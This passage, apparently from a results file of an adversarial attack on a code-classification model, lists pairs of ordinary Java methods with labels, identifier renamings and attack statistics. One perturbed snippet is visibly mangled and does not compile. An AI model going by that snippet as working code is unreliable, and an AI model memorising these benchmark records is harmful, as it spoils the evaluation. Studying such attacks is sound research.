            LogService logServiceMock = EasyMock.createMock(LogService.class);
            DbService dbServiceMock = EasyMock.createMock(DbService.class);
            userServ.setDbServ(dbServiceMock);
            userServ.setLogger(logServiceMock);
            logServiceMock.info(DbUserServiceImpl.class, "">>>identification "" + username + ""<<<"");
            IFeelerUser user = new FeelerUserImpl();
            user.setUsername(username);
            user.setPassword(new String(md5.digest()));
            EasyMock.expect(dbServiceMock.queryFeelerUser(username)).andReturn(user);
            EasyMock.replay(logServiceMock, dbServiceMock);
            Assert.assertTrue(userServ.identification(username, password));
            EasyMock.verify(logServiceMock, dbServiceMock);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
",419,,LABEL_1,LABEL_0,,-4,"doPost,request,response,cu,ud,returnTo,password,md,hash,pass,vis",,,,0,,0,Greedy,1,0.000674442450205485,,[]
265,"    public static void copyFile(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            inChannel.transferTo(0, inChannel.size(), outChannel);
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        InputStream is = null;
        InputStream page = null;
        OutputStream os = null;
        String rootUrl = null;
        try {
            boolean isMultipart = ServletFileUpload.isMultipartContent(request);
            if (!isMultipart) {
                request.setAttribute(""error"", ""Form isn't a multipart form"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ServletFileUpload upload = new ServletFileUpload();
            String webUrl = null;
            FileItemIterator iter = upload.getItemIterator(request);
            while (iter.hasNext()) {
                FileItemStream item = iter.next();
                String name = item.getFieldName();
                if (name.equals(""webpage"")) {
                    is = item.openStream();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    IOUtils.copy(is, baos);
                    page = new ByteArrayInputStream(baos.toByteArray());
                } else if (name.equals(""weburl"")) {
                    InputStream wpIs = null;
                    try {
                        webUrl = Streams.asString(item.openStream());
                        URL u = new URL(webUrl);
                        wpIs = new BufferedInputStream(u.openStream());
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        IOUtils.copy(wpIs, baos);
                        page = new ByteArrayInputStream(baos.toByteArray());
                    } finally {
                        IOUtils.closeQuietly(wpIs);
                    }
                } else if (name.equals(""rooturl"")) {
                    rootUrl = Streams.asString(item.openStream());
                }
            }
            if (page == null) {
                request.setAttribute(""error"", ""Form doesn't have an html file"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ToMailerDelegate delegate = new ToMailerDelegate(page, rootUrl);
            os = new BufferedOutputStream(response.getOutputStream());
            os.write(delegate.getMailer());
            os.flush();
        } catch (Exception e) {
            streamException(request, response, e);
        } finally {
            IOUtils.closeQuietly(page);
            IOUtils.closeQuietly(is);
            IOUtils.closeQuietly(os);
        }
    }
",97,,LABEL_1,LABEL_1,LABEL_1,-1,"copyFile,in,out,inChannel,outChannel",,,,0,,0,GA,1618,0.5959454576174418,failed,[]
266,"    static HttpURLConnection connect(String url, String method, String contentType, String content, int timeoutMillis) throws ProtocolException, IOException, MalformedURLException, UnsupportedEncodingException {
        HttpURLConnection conn = (HttpURLConnection) (new URL(url).openConnection());
        conn.setRequestMethod(method);
        conn.setConnectTimeout(timeoutMillis);
        byte[] bContent = null;
        if (content != null && content.length() > 0) {
            conn.setDoOutput(true);
            conn.setRequestProperty(""Content-Type"", contentType);
            bContent = content.getBytes(""UTF-8"");
            conn.setFixedLengthStreamingMode(bContent.length);
        }
        conn.connect();
        if (bContent != null) {
            OutputStream os = conn.getOutputStream();
            os.write(bContent);
            os.flush();
            os.close();
        }
        return conn;
    }
 <SPLIT>     private static void recurseFiles(File root, File file, ZipArchiveOutputStream zaos, boolean absolute) throws IOException {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File file2 : files) {
                recurseFiles(root, file2, zaos, absolute);
            }
        } else if ((!file.getName().endsWith("".zip"")) && (!file.getName().endsWith("".ZIP""))) {
            String filename = null;
            if (absolute) {
                filename = file.getAbsolutePath().substring(root.getAbsolutePath().length());
            } else {
                filename = file.getName();
            }
            ZipArchiveEntry zae = new ZipArchiveEntry(filename);
            zae.setSize(file.length());
            zaos.putArchiveEntry(zae);
            FileInputStream fis = new FileInputStream(file);
            IOUtils.copy(fis, zaos);
            zaos.closeArchiveEntry();
        }
    }
",168,"    static HttpURLConnection read(String loc, String session, String  contentClass, String file, int timeoutMi) throws ProtocolException, IOException, MalformedURLException, UnsupportedEncodingException {
        HttpURLConnection client = (HttpURLConnection) (new URL(loc).openConnection());
        cclientsetRequestMethod(session);
    clientconn.setConnectTimeout(timeoutMi);
        byte[]  bBody = null;
        if (file != null && file.length() > 0) {
            client.setDoOutput(true);
            coclientetRequestProperty(""Content-Type"",  contentClass);
          bBodyent = file.getBytes(""UTF-8"");
            client.setFixedLengthStreamingMode( bBody.length);
        }
     clientonn.read();
        if ( bBody != null) {
            OutputStream osops client.getOutputStream();
          opsos.write( bBody);
            ops.flush();
            ops.close();
        }
        return client;
    }
",LABEL_0,LABEL_0,0.5318198204040527,1,"connect,url,method,contentType,content,timeoutMillis,conn,bContent,os",,,,0,"connect:read,url:loc,method:session,contentType: contentClass,content:file,timeoutMillis:timeoutMi,conn:client,bContent: bBody,os:ops,",0,GA,2132,0.7708076238632202,ga,[]
267,"    public static void main(String[] args) throws IOException {
        String urltext = ""http://www.vogella.de"";
        URL url = new URL(urltext);
        BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            System.out.println(inputLine);
        }
        in.close();
    }
 <SPLIT>     public static boolean isCodebaseDownloadable(Properties p) {
        class CodebaseData {

            String file;

            boolean success = true;
        }
        String codebase = p.getProperty(""java.rmi.server.codebase"", null);
        if (null == codebase) {
            if (logger.isDebugEnabled()) logger.debug(""java.rmi.server.codebase = null (return false)"");
            return false;
        }
        try {
            URL cbUrl = new URL(codebase);
            String protocol = cbUrl.getProtocol();
            String filename = cbUrl.getFile();
            if (logger.isDebugEnabled()) {
                logger.debug(""Verifying java.rmi.server.codebase setting(s)..."");
                logger.debug(""Codebase = "" + cbUrl.toString());
            }
            if (protocol.equals(""http"")) {
                if (filename.indexOf(""http"") == -1) {
                    try {
                        int size = cbUrl.openConnection().getContentLength();
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : OK"");
                        return true;
                    } catch (IOException e) {
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : FAIL"");
                        return false;
                    } finally {
                        if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    }
                } else {
                    ArrayList files = new ArrayList();
                    StringTokenizer st = new StringTokenizer(codebase);
                    URL url = null;
                    String part = null;
                    CodebaseData data = null;
                    while (st.hasMoreTokens()) {
                        part = st.nextToken();
                        url = new URL(part);
                        data = new CodebaseData();
                        try {
                            int len = url.openConnection().getContentLength();
                            if (len == -1) {
                                data.success = false;
                                data.file = part;
                            } else {
                                data.file = part;
                            }
                        } catch (IOException e) {
                            data.success = false;
                        }
                        files.add(data);
                    }
                    String wrong = null;
                    CodebaseData codebaseData = null;
                    boolean allOK = true;
                    int errorFiles = 0;
                    for (int i = 0; i < files.size(); i++) {
                        codebaseData = (CodebaseData) files.get(i);
                        if (!codebaseData.success) {
                            wrong += "" "" + codebaseData.file;
                            ++errorFiles;
                            allOK = false;
                        }
                        if (logger.isDebugEnabled()) logger.debug((i + 1) + "". Checking "" + codebaseData.file + "" : "" + (codebaseData.success ? ""OK"" : ""FAIL""));
                    }
                    if (errorFiles == 0) {
                        if (logger.isDebugEnabled()) logger.debug(""All entries can be downloaded successfully!"");
                    } else {
                        logger.error(errorFiles + "" of "" + files.size() + "" entries can *not* be downloaded successfully!"");
                    }
                    if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    if (allOK) {
                        return true;
                    } else {
                        return false;
                    }
                }
            } else if (protocol.equalsIgnoreCase(""file"")) {
                if (logger.isDebugEnabled()) logger.debug(""'file' protocol not supported for JSF"");
            }
        } catch (MalformedURLException e) {
            logger.debug(e.getMessage());
            return false;
        }
        return false;
    }
",82,,LABEL_0,LABEL_0,LABEL_0,-1,"urltext,url,in,inputLine",,,,0,,0,GA,1519,0.5676418423652649,failed,[]
268,"    public void init() throws GateException {
        if (reportFile == null) throw new GateException(""No report file set!"");
        boolean restarting = false;
        if (!reportFile.getParentFile().exists() && !reportFile.getParentFile().mkdirs()) {
            throw new GateException(""Could not create directories for "" + reportFile.getAbsolutePath());
        }
        File backupFile = new File(reportFile.getAbsolutePath() + "".bak"");
        if (reportFile.exists()) {
            restarting = true;
            logger.info(""Existing report file found at \"""" + reportFile.getAbsolutePath() + ""\"", attempting to restart"");
            if (!reportFile.renameTo(backupFile)) {
                try {
                    byte[] buff = new byte[32 * 1024];
                    InputStream in = new BufferedInputStream(new FileInputStream(reportFile));
                    try {
                        OutputStream out = new BufferedOutputStream(new FileOutputStream(backupFile));
                        try {
                            int read = in.read(buff);
                            while (read != -1) {
                                out.write(buff, 0, read);
                                read = in.read(buff);
                            }
                        } finally {
                            out.close();
                        }
                    } finally {
                        in.close();
                    }
                } catch (IOException e) {
                    throw new GateException(""Could not restart batch"", e);
                }
            }
        }
        try {
            reportWriter = staxOutputFactory.createXMLStreamWriter(new BufferedOutputStream(new FileOutputStream(reportFile)));
            reportWriter.writeStartDocument();
            reportWriter.writeCharacters(""\n"");
            reportWriter.setDefaultNamespace(Tools.REPORT_NAMESPACE);
            reportWriter.writeStartElement(Tools.REPORT_NAMESPACE, ""cloudReport"");
            reportWriter.writeDefaultNamespace(Tools.REPORT_NAMESPACE);
            reportWriter.writeCharacters(""\n"");
            reportWriter.writeStartElement(Tools.REPORT_NAMESPACE, ""documents"");
        } catch (XMLStreamException e) {
            throw new GateException(""Cannot write to the report file!"", e);
        } catch (IOException e) {
            throw new GateException(""Cannot write to the report file!"", e);
        }
        if (restarting) {
            try {
                Set<String> completedDocuments = new HashSet<String>();
                logger.debug(""Processing existing report file"");
                InputStream bakIn = new BufferedInputStream(new FileInputStream(backupFile));
                XMLEventReader xer = staxInputFactory.createXMLEventReader(bakIn);
                try {
                    XMLEvent event;
                    while (xer.hasNext()) {
                        event = xer.nextEvent();
                        if (event.isStartElement() && event.asStartElement().getName().getLocalPart().equals(""documents"")) {
                            break;
                        }
                    }
                    List<XMLEvent> events = new LinkedList<XMLEvent>();
                    String currentReturnCode = null;
                    String currentDocid = null;
                    while (xer.hasNext()) {
                        event = xer.nextEvent();
                        events.add(event);
                        if (event.isStartElement() && event.asStartElement().getName().getLocalPart().equals(""processResult"")) {
                            currentReturnCode = event.asStartElement().getAttributeByName(new QName(XMLConstants.NULL_NS_URI, ""returnCode"")).getValue();
                            currentDocid = event.asStartElement().getAttributeByName(new QName(XMLConstants.NULL_NS_URI, ""id"")).getValue();
                        }
                        if (event.isEndElement() && event.asEndElement().getName().getLocalPart().equals(""processResult"")) {
                            if (currentReturnCode.equals(""SUCCESS"") && currentDocid != null) {
                                completedDocuments.add(currentDocid);
                                for (XMLEvent evt : events) {
                                    Tools.writeStaxEvent(evt, reportWriter);
                                }
                            }
                            events.clear();
                            currentReturnCode = null;
                            currentDocid = null;
                        }
                        if (event.isEndElement() && event.asEndElement().getName().getLocalPart().equals(""documents"")) {
                            break;
                        }
                    }
                } catch (Exception e) {
                    logger.debug(""Exception while parsing old report file - probably "" + ""reached the end of old report"", e);
                } finally {
                    xer.close();
                    bakIn.close();
                    backupFile.delete();
                }
                List<String> unprocessedDocs = new ArrayList<String>();
                unprocessedDocs.addAll(Arrays.asList(documentIDs));
                unprocessedDocs.removeAll(completedDocuments);
                unprocessedDocumentIDs = unprocessedDocs.toArray(new String[unprocessedDocs.size()]);
            } catch (XMLStreamException e) {
                throw new GateException(""Cannot write to the report file!"", e);
            } catch (IOException e) {
                throw new GateException(""Cannot write to the report file!"", e);
            }
        } else {
            unprocessedDocumentIDs = documentIDs;
        }
    }
 <SPLIT>         private boolean doCSVImport(String tableName, final boolean hasHeader) {
            StringBuffer sql = new StringBuffer();
            sql.append(""INSERT INTO "");
            sql.append(tableName + ""("");
            for (int i = 0; i < colNames.size(); i++) {
                sql.append("""" + colNames.get(i) + "","");
            }
            sql.setLength(sql.length() - 1);
            sql.append("") VALUES( "");
            for (int i = 0; i < colNames.size(); i++) {
                sql.append(""?,"");
            }
            sql.setLength(sql.length() - 1);
            sql.append("")"");
            Connection conn = null;
            int lineNumber = 0;
            int colNumber = 0;
            String line[] = null;
            try {
                conn = DBExplorer.getConnection(false);
                conn.setAutoCommit(false);
                PreparedStatement pstmt = conn.prepareStatement(sql.toString());
                for (; lineNumber < csvData.size(); lineNumber++) {
                    if (hasHeader && lineNumber == 0) continue;
                    dlg.UpdateProgressBar(lineNumber);
                    if (cancel) {
                        break;
                    }
                    line = (String[]) csvData.get(lineNumber);
                    pstmt.clearParameters();
                    for (colNumber = 0; colNumber < colTypes.size(); colNumber++) {
                        if (line[colNumber].equals("""") && colNullAllowed.get(colNumber).toString().equals(""true"")) {
                            pstmt.setNull(colNumber + 1, Integer.parseInt(colTypeInt.get(colNumber).toString()));
                        } else {
                            pstmt.setObject(colNumber + 1, line[colNumber], Integer.parseInt(colTypeInt.get(colNumber).toString()));
                        }
                    }
                    pstmt.executeUpdate();
                }
                if (cancel) conn.rollback(); else conn.commit();
                conn.setAutoCommit(true);
                conn.close();
                conn = null;
                dialog.getDisplay().asyncExec(new Runnable() {

                    public void run() {
                        if (!cancel) {
                            dlg.showMessage(title, ""Imported "" + maxsize + "" rows successfully."");
                            statusLabel.setText(""Import complete."");
                        } else {
                            dlg.UpdateProgressBar(0);
                            statusLabel.setText(""Import aborted."");
                        }
                    }
                });
                return true;
            } catch (final Exception e) {
                if (conn != null) try {
                    conn.rollback();
                } catch (SQLException e1) {
                    e1.printStackTrace();
                }
                dialog.getDisplay().asyncExec(new Runnable() {

                    public void run() {
                        statusLabel.setText(""Import failed"");
                        dlg.showError(title, e.getMessage());
                        dlg.UpdateProgressBar(0);
                    }
                });
                return false;
            } finally {
                if (conn != null) try {
                    conn.close();
                } catch (SQLException e) {
                    e.printStackTrace();
                }
            }
        }
",884,,LABEL_0,LABEL_1,,-4,"init,backupFile,buff,in,out,read,reportWriter,restarting",,,,0,,0,Greedy,1,0.0010937968889872232,,[]
269,"    public String httpRequestByPOST(String url, int timeout, List<NameValuePair> params) {
        String response = """";
        try {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params, ""UTF-8""));
            HttpResponse serverResponse = httpClient.execute(httpPost);
            StatusLine statusLine = serverResponse.getStatusLine();
            if (statusLine.getStatusCode() < 400) {
                InputStream inputStream = serverResponse.getEntity().getContent();
                InputStreamReader inputReader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(inputReader);
                StringBuffer buffer = new StringBuffer();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    buffer.append(line);
                }
                response = buffer.toString();
                inputStream.close();
            } else {
                this.lastErrorCode = String.valueOf(statusLine.getStatusCode());
                this.lastErrorMessage = statusLine.getReasonPhrase();
                return null;
            }
        } catch (IOException e) {
            this.lastErrorCode = ""-1"";
            this.lastErrorMessage = e.getLocalizedMessage();
            return null;
        }
        return response;
    }
 <SPLIT>     public DataSet parse() throws SnifflibDatatypeException {
        NumberFormat numformat = NumberFormat.getInstance();
        if (this.headers.size() != this.types.size()) {
            throw new SnifflibDatatypeException(""Different number of headers ("" + this.headers.size() + "") and types("" + this.types.size() + "")."");
        }
        DataSet out = null;
        if (!this.dryrun) {
            out = new DataSet();
        }
        BufferedReader r = null;
        StreamTokenizer tokenizer = null;
        try {
            if (this.isURL) {
                if (this.url2goto == null) {
                    return (null);
                }
                DataInputStream in = null;
                try {
                    in = new DataInputStream(this.url2goto.openStream());
                    System.out.println(""READY TO READ FROM URL:"" + url2goto);
                    r = new BufferedReader(new InputStreamReader(in));
                } catch (Exception err) {
                    throw new RuntimeException(""Problem reading from URL "" + this.url2goto + ""."", err);
                }
            } else {
                if (this.file == null) {
                    throw new RuntimeException(""Data file to be parsed can not be null."");
                }
                if (!this.file.exists()) {
                    throw new RuntimeException(""The file "" + this.file + "" does not exist."");
                }
                r = new BufferedReader(new FileReader(this.file));
            }
            if (this.ignorePreHeaderLines > 0) {
                String strLine;
                int k = 0;
                while ((k < this.ignorePreHeaderLines) && ((strLine = r.readLine()) != null)) {
                    k++;
                }
            }
            tokenizer = new StreamTokenizer(r);
            tokenizer.resetSyntax();
            tokenizer.eolIsSignificant(true);
            tokenizer.parseNumbers();
            if (this.delimiter.equals(""\\t"")) {
                tokenizer.whitespaceChars('\t', '\t');
            }
            if (this.delimiter.equals("","")) {
                tokenizer.whitespaceChars(',', ',');
            }
            tokenizer.quoteChar('""');
            tokenizer.whitespaceChars(' ', ' ');
            boolean readingHeaders = true;
            boolean readingInitialValues = false;
            boolean readingData = false;
            boolean readingScientificNotation = false;
            if (this.headers.size() > 0) {
                readingHeaders = false;
                readingInitialValues = true;
            }
            if (this.types.size() > 0) {
                readingInitialValues = false;
                Class targetclass;
                for (int j = 0; j < this.types.size(); j++) {
                    targetclass = (Class) this.types.get(j);
                    try {
                        this.constructors.add(targetclass.getConstructor(String.class));
                    } catch (java.lang.NoSuchMethodException err) {
                        throw new SnifflibDatatypeException(""Could not find appropriate constructor for "" + targetclass + "". "" + err.getMessage());
                    }
                }
                readingData = true;
            }
            int currentColumn = 0;
            int currentRow = 0;
            this.rowcount = 0;
            boolean advanceField = true;
            while (true) {
                tokenizer.nextToken();
                switch(tokenizer.ttype) {
                    case StreamTokenizer.TT_WORD:
                        {
                            if (readingScientificNotation) {
                                throw new RuntimeException(""Problem reading scientific notation at row "" + currentRow + "" column "" + currentColumn + ""."");
                            }
                            advanceField = true;
                            if (readingHeaders) {
                                this.headers.add(tokenizer.sval);
                            } else {
                                if (readingInitialValues) {
                                    this.types.add(String.class);
                                }
                                if (!this.dryrun) {
                                    if (out.getColumnCount() <= currentColumn) {
                                        out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                    }
                                }
                                try {
                                    Constructor construct;
                                    if (currentColumn < this.constructors.size()) {
                                        construct = (Constructor) this.constructors.get(currentColumn);
                                    } else {
                                        Class targetclass = (Class) this.types.get(currentColumn);
                                        construct = targetclass.getConstructor(String.class);
                                        this.constructors.add(construct);
                                    }
                                    try {
                                        try {
                                            try {
                                                if (!this.dryrun) {
                                                    out.setValueAt(construct.newInstance((String) tokenizer.sval), currentRow, currentColumn);
                                                } else if (this.findingTargetValue) {
                                                    if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                        this.targetValue = construct.newInstance((String) tokenizer.sval);
                                                        r.close();
                                                        return (null);
                                                    }
                                                }
                                            } catch (java.lang.reflect.InvocationTargetException err) {
                                                throw new SnifflibDatatypeException(""Problem constructing 1"" + err.getMessage());
                                            }
                                        } catch (java.lang.IllegalAccessException err) {
                                            throw new SnifflibDatatypeException(""Problem constructing 2"" + err.getMessage());
                                        }
                                    } catch (java.lang.InstantiationException err) {
                                        throw new SnifflibDatatypeException(""Problem constructing 3"" + err.getMessage());
                                    }
                                } catch (java.lang.NoSuchMethodException err) {
                                    throw new SnifflibDatatypeException(""Problem constructing 4"" + err.getMessage());
                                }
                            }
                            break;
                        }
                    case StreamTokenizer.TT_NUMBER:
                        {
                            advanceField = true;
                            if (readingHeaders) {
                                throw new SnifflibDatatypeException(""Expecting string header at row="" + currentRow + "", column="" + currentColumn + ""."");
                            } else {
                                if (readingInitialValues) {
                                    this.types.add(Double.class);
                                }
                                if (!this.dryrun) {
                                    if (out.getColumnCount() <= currentColumn) {
                                        out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                    }
                                }
                                try {
                                    Constructor construct;
                                    if (currentColumn < this.constructors.size()) {
                                        construct = (Constructor) this.constructors.get(currentColumn);
                                    } else {
                                        Class targetclass = (Class) this.types.get(currentColumn);
                                        construct = targetclass.getConstructor(double.class);
                                        this.constructors.add(construct);
                                    }
                                    if (readingScientificNotation) {
                                        Double val = this.scientificNumber;
                                        if (!this.dryrun) {
                                            try {
                                                out.setValueAt(new Double(val.doubleValue() * tokenizer.nval), currentRow, currentColumn);
                                            } catch (Exception err) {
                                                throw new SnifflibDatatypeException(""Problem constructing "" + construct.getDeclaringClass() + ""at row "" + currentRow + "" column "" + currentColumn + ""."", err);
                                            }
                                        } else if (this.findingTargetValue) {
                                            if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                Double NVAL = new Double(tokenizer.nval);
                                                try {
                                                    this.targetValue = numformat.parse(val + ""E"" + NVAL);
                                                } catch (Exception err) {
                                                    throw new RuntimeException(""Problem parsing scientific notation at row="" + currentRow + "" col="" + currentColumn + ""."");
                                                }
                                                tokenizer.nextToken();
                                                if (tokenizer.ttype != 'e') {
                                                    r.close();
                                                    return (null);
                                                } else {
                                                    tokenizer.pushBack();
                                                }
                                            }
                                        }
                                        readingScientificNotation = false;
                                    } else {
                                        try {
                                            this.scientificNumber = new Double(tokenizer.nval);
                                            if (!this.dryrun) {
                                                out.setValueAt(this.scientificNumber, currentRow, currentColumn);
                                            } else if (this.findingTargetValue) {
                                                if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                    this.targetValue = this.scientificNumber;
                                                    r.close();
                                                    return (null);
                                                }
                                            }
                                        } catch (Exception err) {
                                            throw new SnifflibDatatypeException(""Problem constructing "" + construct.getDeclaringClass() + ""at row "" + currentRow + "" column "" + currentColumn + ""."", err);
                                        }
                                    }
                                } catch (java.lang.NoSuchMethodException err) {
                                    throw new SnifflibDatatypeException(""Problem constructing"" + err.getMessage());
                                }
                            }
                            break;
                        }
                    case StreamTokenizer.TT_EOL:
                        {
                            if (readingHeaders) {
                                readingHeaders = false;
                                readingInitialValues = true;
                            } else {
                                if (readingInitialValues) {
                                    readingInitialValues = false;
                                    readingData = true;
                                }
                            }
                            if (readingData) {
                                currentRow++;
                            }
                            break;
                        }
                    case StreamTokenizer.TT_EOF:
                        {
                            if (readingHeaders) {
                                throw new SnifflibDatatypeException(""End of file reached while reading headers."");
                            }
                            if (readingInitialValues) {
                                throw new SnifflibDatatypeException(""End of file reached while reading initial values."");
                            }
                            if (readingData) {
                                readingData = false;
                            }
                            break;
                        }
                    default:
                        {
                            if (tokenizer.ttype == '""') {
                                advanceField = true;
                                if (readingHeaders) {
                                    this.headers.add(tokenizer.sval);
                                } else {
                                    if (readingInitialValues) {
                                        this.types.add(String.class);
                                    }
                                    if (!this.dryrun) {
                                        if (out.getColumnCount() <= currentColumn) {
                                            out.addColumn((String) this.headers.get(currentColumn), (Class) this.types.get(currentColumn));
                                        }
                                    }
                                    try {
                                        Constructor construct;
                                        if (currentColumn < this.constructors.size()) {
                                            construct = (Constructor) this.constructors.get(currentColumn);
                                        } else {
                                            Class targetclass = (Class) this.types.get(currentColumn);
                                            construct = targetclass.getConstructor(String.class);
                                            this.constructors.add(construct);
                                        }
                                        try {
                                            try {
                                                try {
                                                    if (!this.dryrun) {
                                                        out.setValueAt(construct.newInstance((String) tokenizer.sval), currentRow, currentColumn);
                                                    } else if (this.findingTargetValue) {
                                                        if ((this.targetRow == currentRow) && (this.targetColumn == currentColumn)) {
                                                            this.targetValue = construct.newInstance((String) tokenizer.sval);
                                                            r.close();
                                                            return (null);
                                                        }
                                                    }
                                                } catch (java.lang.reflect.InvocationTargetException err) {
                                                    throw new SnifflibDatatypeException(""Problem constructing 1 "" + err.getMessage());
                                                }
                                            } catch (java.lang.IllegalAccessException err) {
                                                throw new SnifflibDatatypeException(""Problem constructing 2 "" + err.getMessage());
                                            }
                                        } catch (java.lang.InstantiationException err) {
                                            throw new SnifflibDatatypeException(""Problem constructing 3 "" + err.getMessage());
                                        }
                                    } catch (java.lang.NoSuchMethodException err) {
                                        throw new SnifflibDatatypeException(""Problem constructing 4"" + err.getMessage());
                                    }
                                }
                            } else if (tokenizer.ttype == 'e') {
                                Class targetclass = (Class) this.types.get(currentColumn);
                                if (Number.class.isAssignableFrom(targetclass)) {
                                    currentColumn--;
                                    readingScientificNotation = true;
                                    advanceField = false;
                                }
                            } else {
                                advanceField = false;
                            }
                            break;
                        }
                }
                if (tokenizer.ttype == StreamTokenizer.TT_EOF) {
                    break;
                }
                if (advanceField) {
                    currentColumn++;
                    if (!readingHeaders) {
                        if (currentColumn >= this.headers.size()) {
                            currentColumn = 0;
                        }
                    }
                }
            }
            if (!readingHeaders) {
                this.rowcount = currentRow;
            } else {
                this.rowcount = 0;
                readingHeaders = false;
                if (this.ignorePostHeaderLines > 0) {
                    String strLine;
                    int k = 0;
                    while ((k < this.ignorePostHeaderLines) && ((strLine = r.readLine()) != null)) {
                        k++;
                    }
                }
            }
            r.close();
        } catch (java.io.IOException err) {
            throw new SnifflibDatatypeException(err.getMessage());
        }
        if (!this.dryrun) {
            for (int j = 0; j < this.headers.size(); j++) {
                out.setColumnName(j, (String) this.headers.get(j));
            }
        }
        return (out);
    }
",232,,LABEL_1,LABEL_0,,-4,"httpRequestByPOST,url,timeout,params,response,httpClient,httpPost,serverResponse,statusLine,inputStream,inputReader,bufferedReader,buffer,line,lastErrorCode,lastErrorMessage",,,,0,,0,Greedy,1,0.0011477947235107421,,[]
270,"    public static void main(String[] args) {
        FTPClient client = new FTPClient();
        try {
            client.connect(""192.168.1.10"");
            client.login(""a"", ""123456"");
            String[] names = client.listNames();
            for (String name : names) {
                System.out.println(""Name = "" + name);
            }
            FTPFile[] ftpFiles = client.listFiles();
            for (FTPFile ftpFile : ftpFiles) {
                if (ftpFile.getType() == FTPFile.FILE_TYPE) {
                    System.out.println(""FTPFile: "" + ftpFile.getName() + ""; "" + FileUtils.byteCountToDisplaySize(ftpFile.getSize()));
                }
            }
            client.logout();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                client.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
 <SPLIT>     protected void doUpload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        HttpSession reqSession = request.getSession();
        ArrayList<File> uploadFiles = new ArrayList<File>();
        LOG.info(""UploadServlet Upload request received"");
        if (ServletFileUpload.isMultipartContent(request)) {
            LOG.debug(""UploadServlet Received a multipart request."");
        } else {
            LOG.debug(""UploadServlet Received a non-multipart request."");
        }
        String tempDirName = UUID.randomUUID().toString();
        File tempUploadDir = new File(adapter.getRootPath() + File.separator + ""temp"" + File.separator + tempDirName);
        tempUploadDir.getParentFile().mkdir();
        while (tempUploadDir.exists()) {
            tempDirName = UUID.randomUUID().toString();
            tempUploadDir = new File(adapter.getRootPath() + File.separator + ""temp"" + File.separator + tempDirName);
        }
        tempUploadDir.mkdir();
        File attachmentDir = (File) (reqSession.getAttribute(""up2p:attachdir""));
        if (attachmentDir != null) {
            LOG.info(""UploadServlet: Copying provided attachment to upload dir from: "" + attachmentDir.getAbsolutePath());
            tempUploadDir.delete();
            attachmentDir.renameTo(tempUploadDir);
            reqSession.removeAttribute(""up2p:attachdir"");
        }
        LOG.info(""UploadServlet: Using temporary directory: "" + tempUploadDir.getPath());
        PairList paramMap = null;
        if (ServletFileUpload.isMultipartContent(request)) {
            paramMap = getMultipartParameters(request, uploadHandler, LOG, tempUploadDir.getPath());
            if (paramMap.size() == 0) {
                LOG.debug(""UploadServlet Parsed multipart request and "" + ""found no parameters. Parsing as regular"" + "" request instead."");
                paramMap = copyParameters(request);
                LOG.debug(""UploadServlet Parsed as regular request and found "" + paramMap.size() + "" parameters."");
            }
        } else {
            paramMap = copyParameters(request);
        }
        String communityId = getCurrentCommunityId(request.getSession());
        String newcommunity = paramMap.getValue(HttpParams.UP2P_COMMUNITY);
        LOG.debug(""UploadServlet: Got active community: "" + newcommunity);
        if (newcommunity != null) {
            communityId = newcommunity;
            LOG.debug(""switching to community"" + communityId);
        }
        if (communityId == null || communityId.length() == 0) {
            LOG.warn(""UploadServlet Current community ID is missing from"" + ""the user session."");
            writeError(request, response, ""The current community is unknown."" + "" Please select a community before performing "" + ""any actions."", paramMap);
            for (File f : tempUploadDir.listFiles()) {
                f.delete();
            }
            tempUploadDir.delete();
            return;
        }
        LOG.info(""UploadServlet Uploading to community "" + communityId + ""."");
        uploadFiles.clear();
        Iterator<String> uploadedFileIter = paramMap.getValues(HttpParams.UP2P_FILENAME);
        String filename = """";
        try {
            if (uploadedFileIter.hasNext()) {
                filename = uploadedFileIter.next();
            } else {
                throw new IOException(""UploadServlet: No up2p:filename parameters were found."");
            }
            if (filename.startsWith(""file:"")) filename = filename.substring(5);
            if (filename.length() == 0) {
                throw new IOException(""UploadServlet: An empty up2p:filename parameter was submitted."");
            }
            File resourceFile = null;
            resourceFile = new File(adapter.getStorageDirectory(communityId), filename);
            File tempResFile = new File(tempUploadDir, filename);
            if (!tempResFile.exists() && !resourceFile.exists()) {
                throw new IOException(""UploadServlet: The uploaded resource could not be found."");
            }
            if ((tempResFile.exists() && resourceFile.exists()) || (tempResFile.exists() && !resourceFile.exists())) {
                resourceFile = FileUtil.createUniqueFile(resourceFile);
                LOG.info(""UploadServlet: Direct upload, copying resource file.\n\tOriginal: "" + tempResFile.getPath() + ""\n\tNew: "" + resourceFile.getPath());
                resourceFile.getParentFile().mkdir();
